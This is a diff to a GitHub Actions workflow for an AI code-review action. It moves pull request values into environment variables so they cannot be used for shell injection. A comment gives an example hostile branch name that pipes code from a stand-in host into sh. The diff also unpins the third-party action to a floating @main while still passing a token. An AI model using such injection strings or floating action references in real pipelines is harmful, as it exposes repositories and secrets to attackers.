@@ -79,8 +79,38 @@ jobs:
       - name: Install dependencies
         run: composer install --ignore-platform-reqs
 
+      # The reviewer reference floats, so record where main pointed when this
+      # run started. This is NOT the commit that necessarily executed: GitHub
+      # resolves @main when the action step runs, so a push landing in between
+      # would make the two differ. The recorded SHA bounds that window rather
+      # than eliminating it; the run log's action-resolution line is
+      # authoritative, and the jobs API redacts the resolved ref, so there is
+      # no reliable in-run API read-back to claim instead.
+      #
+      # The point is traceability, not a guarantee: without this the run page
+      # says nothing about which reviewer code was in play.
+      - name: Record the reviewer main at run start
+        env:
+          # The reviewer repository is public, so the default token is enough.
+          # The PAT is reserved for the reviewer's own write operations.
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          set -euo pipefail
+          SHA=$(gh api repos/nilesh32236/opencode-ai-reviewer/commits/main --jq .sha)
+          [[ "$SHA" =~ ^[a-f0-9]{40}$ ]]
+          echo "sha=$SHA" >> "$GITHUB_OUTPUT"
+          {
+            echo "### OpenCode AI Reviewer revision"
+            echo
+            echo "Reviewer \`main\` at the start of this run (the step resolves @main at execution time, so a commit landing in between is possible):"
+            echo
+            echo "\`$SHA\`"
+            echo
+            echo "https://github.com/nilesh32236/opencode-ai-reviewer/commit/$SHA"
+          } >> "$GITHUB_STEP_SUMMARY"
+
       - name: Fix Issue
-        uses: nilesh32236/opencode-ai-reviewer@103082c963f64cb2cf979ae14b729ec41d40866e # v1.22.0
+        uses: nilesh32236/opencode-ai-reviewer@main
         with:
           mode: fix
           github_token: ${{ secrets.GH_PAT || secrets.GITHUB_TOKEN }}
@@ -135,13 +165,22 @@ jobs:
         id: resolve-ref
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          # Attacker-controlled values must reach the shell through the
+          # environment, never by interpolation into the script body. A pull
+          # request branch name is free text chosen by whoever opened the pull
+          # request, so embedding ${{ github.event.pull_request.head.ref }}
+          # directly in a run: block lets a branch named
+          # 'x"; curl evil.sh | sh; #' execute here.
+          EVENT_NAME: ${{ github.event_name }}
+          ISSUE_NUMBER: ${{ github.event.issue.number }}
+          PR_HEAD_REF: ${{ github.event.pull_request.head.ref }}
+          REPOSITORY: ${{ github.repository }}
         run: |
-          if [ "${{ github.event_name }}" = "issue_comment" ]; then
-            PR_NUMBER="${{ github.event.issue.number }}"
-            REF=$(gh pr view "$PR_NUMBER" --repo "${{ github.repository }}" --json headRefName --jq .headRefName)
+          if [ "$EVENT_NAME" = "issue_comment" ]; then
+            REF=$(gh pr view "$ISSUE_NUMBER" --repo "$REPOSITORY" --json headRefName --jq .headRefName)
             echo "ref=$REF" >> "$GITHUB_OUTPUT"
           else
-            echo "ref=${{ github.event.pull_request.head.ref }}" >> "$GITHUB_OUTPUT"
+            echo "ref=$PR_HEAD_REF" >> "$GITHUB_OUTPUT"
           fi
 
       - uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6
@@ -160,8 +199,38 @@ jobs:
       - name: Install dependencies
         run: composer install --ignore-platform-reqs
 
+      # The reviewer reference floats, so record where main pointed when this
+      # run started. This is NOT the commit that necessarily executed: GitHub
+      # resolves @main when the action step runs, so a push landing in between
+      # would make the two differ. The recorded SHA bounds that window rather
+      # than eliminating it; the run log's action-resolution line is
+      # authoritative, and the jobs API redacts the resolved ref, so there is
+      # no reliable in-run API read-back to claim instead.
+      #
+      # The point is traceability, not a guarantee: without this the run page
+      # says nothing about which reviewer code was in play.
+      - name: Record the reviewer main at run start
+        env:
+          # The reviewer repository is public, so the default token is enough.
+          # The PAT is reserved for the reviewer's own write operations.
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          set -euo pipefail
+          SHA=$(gh api repos/nilesh32236/opencode-ai-reviewer/commits/main --jq .sha)
+          [[ "$SHA" =~ ^[a-f0-9]{40}$ ]]
+          echo "sha=$SHA" >> "$GITHUB_OUTPUT"
+          {
+            echo "### OpenCode AI Reviewer revision"
+            echo
+            echo "Reviewer \`main\` at the start of this run (the step resolves @main at execution time, so a commit landing in between is possible):"
+            echo
+            echo "\`$SHA\`"
+            echo
+            echo "https://github.com/nilesh32236/opencode-ai-reviewer/commit/$SHA"
+          } >> "$GITHUB_STEP_SUMMARY"
+
       - name: AI Code Review
-        uses: nilesh32236/opencode-ai-reviewer@103082c963f64cb2cf979ae14b729ec41d40866e # v1.22.0
+        uses: nilesh32236/opencode-ai-reviewer@main
         with:
           mode: review
           github_token: ${{ secrets.GH_PAT || secrets.GITHUB_TOKEN }}
@@ -211,15 +280,23 @@ jobs:
         id: resolve-ref
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          # See the note in the review job: a pull request branch name is
+          # attacker-controlled free text and must not be interpolated into a
+          # run: block.
+          EVENT_NAME: ${{ github.event_name }}
+          ISSUE_NUMBER: ${{ github.event.issue.number }}
+          PR_HEAD_REF: ${{ github.event.pull_request.head.ref }}
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+          REPOSITORY: ${{ github.repository }}
         run: |
-          if [ "${{ github.event_name }}" = "issue_comment" ]; then
-            PR_NUMBER="${{ github.event.issue.number }}"
-            REF=$(gh pr view "$PR_NUMBER" --repo "${{ github.repository }}" --json headRefName --jq .headRefName)
+          if [ "$EVENT_NAME" = "issue_comment" ]; then
+            PR_NUMBER="$ISSUE_NUMBER"
+            REF=$(gh pr view "$PR_NUMBER" --repo "$REPOSITORY" --json headRefName --jq .headRefName)
             echo "ref=$REF" >> "$GITHUB_OUTPUT"
             echo "number=$PR_NUMBER" >> "$GITHUB_OUTPUT"
           else
-            echo "ref=${{ github.event.pull_request.head.ref }}" >> "$GITHUB_OUTPUT"
-            echo "number=${{ github.event.pull_request.number }}" >> "$GITHUB_OUTPUT"
+            echo "ref=$PR_HEAD_REF" >> "$GITHUB_OUTPUT"
+            echo "number=$PR_NUMBER" >> "$GITHUB_OUTPUT"
           fi
 
       - uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6
@@ -237,8 +314,38 @@ jobs:
       - name: Install dependencies
         run: composer install --ignore-platform-reqs
 
+      # The reviewer reference floats, so record where main pointed when this
+      # run started. This is NOT the commit that necessarily executed: GitHub
+      # resolves @main when the action step runs, so a push landing in between
+      # would make the two differ. The recorded SHA bounds that window rather
+      # than eliminating it; the run log's action-resolution line is
+      # authoritative, and the jobs API redacts the resolved ref, so there is
+      # no reliable in-run API read-back to claim instead.
+      #
+      # The point is traceability, not a guarantee: without this the run page
+      # says nothing about which reviewer code was in play.
+      - name: Record the reviewer main at run start
+        env:
+          # The reviewer repository is public, so the default token is enough.
+          # The PAT is reserved for the reviewer's own write operations.
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          set -euo pipefail
+          SHA=$(gh api repos/nilesh32236/opencode-ai-reviewer/commits/main --jq .sha)
+          [[ "$SHA" =~ ^[a-f0-9]{40}$ ]]
+          echo "sha=$SHA" >> "$GITHUB_OUTPUT"
+          {
+            echo "### OpenCode AI Reviewer revision"
+            echo
+            echo "Reviewer \`main\` at the start of this run (the step resolves @main at execution time, so a commit landing in between is possible):"
+            echo
+            echo "\`$SHA\`"
+            echo
+            echo "https://github.com/nilesh32236/opencode-ai-reviewer/commit/$SHA"
+          } >> "$GITHUB_STEP_SUMMARY"
+
       - name: AI Fix
-        uses: nilesh32236/opencode-ai-reviewer@103082c963f64cb2cf979ae14b729ec41d40866e # v1.22.0
+        uses: nilesh32236/opencode-ai-reviewer@main
         with:
           mode: fix
           github_token: ${{ secrets.GH_PAT || secrets.GITHUB_TOKEN }}
@@ -274,11 +381,15 @@ jobs:
     steps:
       - name: Merge when CI is green
         env:
-          GH_TOKEN: ${{ secrets.GH_PAT || secrets.GITHUB_TOKEN }}
+          # The reviewer repository is public, so the default token is enough.
+          # The PAT is reserved for the reviewer's own write operations.
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+          REPOSITORY: ${{ github.repository }}
         run: |
-          PR="${{ github.event.pull_request.number }}"
+          PR="$PR_NUMBER"
           for i in $(seq 1 12); do
-            STATE=$(gh pr view "$PR" --repo "${{ github.repository }}" --json statusCheckRollup --jq '[.statusCheckRollup[].conclusion] | if length == 0 then "pending" elif all(. == "SUCCESS" or . == "SKIPPED") then "green" elif any(. == "FAILURE") then "red" else "pending" end')
+            STATE=$(gh pr view "$PR" --repo "$REPOSITORY" --json statusCheckRollup --jq '[.statusCheckRollup[].conclusion] | if length == 0 then "pending" elif all(. == "SUCCESS" or . == "SKIPPED") then "green" elif any(. == "FAILURE") then "red" else "pending" end')
             echo "CI state: $STATE (try $i/12)"
             [ "$STATE" = "green" ] && break
             [ "$STATE" = "red" ] && { echo "CI failed — not merging."; exit 1; }
